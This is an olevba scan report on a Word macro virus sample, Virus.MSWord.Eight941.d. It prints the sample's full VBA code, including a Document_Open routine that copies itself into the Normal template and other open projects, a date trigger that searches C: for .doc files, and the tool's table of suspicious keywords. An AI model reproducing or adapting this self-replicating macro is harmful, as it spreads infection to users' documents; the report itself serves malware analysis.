olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Eight941.d-fe90854fc69e5728337b7d76642548b4ce1f033d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Eight941.d-fe90854fc69e5728337b7d76642548b4ce1f033d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' BA&H User
' BA&H
'
' 3/21/00 3:38:31 PM
'
' BA&H User
' BA&H
'
' 3/21/00 3:34:14 PM
'
' BA&H User
' BA&H
'
' 3/21/00 3:29:11 PM
'
' BA&H User
' BA&H
'
' 3/21/00 2:43:47 PM
'
' BA&H User
' BA&H
'
' 3/21/00 2:40:14 PM
'
' BA&H User
' BA&H
'
' 3/21/00 2:22:19 PM
'
' BA&H User
' BA&H
'
' 3/20/00 5:05:31 PM
'
' BA&H User
' BA&H
'
' 3/20/00 7:45:59 AM
'
' BA&H User
' BA&H
'
' 3/17/00 1:41:48 PM
'
' BA&H User
' BA&H
'
' 3/17/00 1:41:03 PM
'
' BA&H User
' BA&H
'
' 3/16/00 2:43:29 PM
'
' BA&H User
' BA&H
'
' 3/15/00 7:33:33 PM
'
' BA&H User
' BA&H
'
' 3/15/00 7:19:33 PM
'
' BA&H User
' BA&H
'
' 3/15/00 3:05:34 PM
'
' BA&H User
' BA&H
'
' 3/15/00 3:03:06 PM
'
' BA&H User
' BA&H
'
' 3/15/00 2:36:17 PM
'
' BA&H User
' BA&H
'
' 3/15/00 2:33:54 PM
'
' BA&H User
' BA&H
'
' 3/15/00 12:45:07 PM
'
Private Sub Document_Open()
On Error GoTo 0
Dim i, j As Integer
j = -1
For i = 1 To Application.VBE.VBProjects.Count
    If Application.VBE.VBProjects(i).Name = "Normal" Then
        j = i
    End If
    If Application.VBE.VBProjects(i).VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 100) = False Then
        Dim B, l As Integer
            If j > 0 Then
                If Application.VBE.VBProjects(j).VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 100) = True Then
                    B = Application.VBE.VBProjects(j).VBComponents(1).CodeModule.ProcStartLine("Document_Open", vbext_pk_Proc)
                    l = Application.VBE.VBProjects(j).VBComponents(1).CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                    Application.VBE.VBProjects(i).VBComponents(1).CodeModule.AddFromString Application.VBE.VBProjects(j).VBComponents(1).CodeModule.Lines(B, B + l)
                Else
                    B = Me.VBProject.VBComponents(1).CodeModule.ProcStartLine("Document_Open", vbext_pk_Proc)
                    l = Me.VBProject.VBComponents(1).CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                    Application.VBE.VBProjects(i).VBComponents(1).CodeModule.AddFromString Me.VBProject.VBComponents(1).CodeModule.Lines(B, B + l)
            End If
        End If
    End If
Next i
If (Month(Date) = 11 And Day(Date) = 10) Or (Month(Date) = 7 And Day(Date) = 1) Then
Set fs = Application.FileSearch
    fs.LookIn = "c:\"
    fs.FileName = "*.doc"
    fs.SearchSubFolders = True
    If fs.Execute() > 0 Then
        For i = 1 To fs.FoundFiles.Count
            
            
            Options.AllowFastSave = True
            Options.BackgroundSave = True
            Options.CreateBackup = False
            Options.SavePropertiesPrompt = False
            Options.SaveNormalPrompt = False
Exitub:
               Next i
    End If
End If
End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

